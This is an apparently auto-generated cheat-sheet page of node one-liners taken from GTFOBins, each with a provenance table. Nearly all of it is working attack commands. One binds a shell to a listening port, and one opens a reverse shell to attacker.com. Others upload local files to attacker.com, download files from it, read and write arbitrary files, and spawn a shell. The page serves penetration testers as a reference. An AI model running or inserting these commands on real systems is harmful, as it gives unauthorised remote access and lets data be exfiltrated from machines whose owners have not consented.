---
parsed_by: focuslocust
source: commands
type: generated
---
# node Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## node

Tool page: [node](../../tools/linux/node.md)

### bind-shell

```text
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |

### download

```text
node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(12345, "attacker.com", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |

### shell

```text
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |

### upload

```text
node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/node` |
| Evidence | Function example preserved from source parser. |
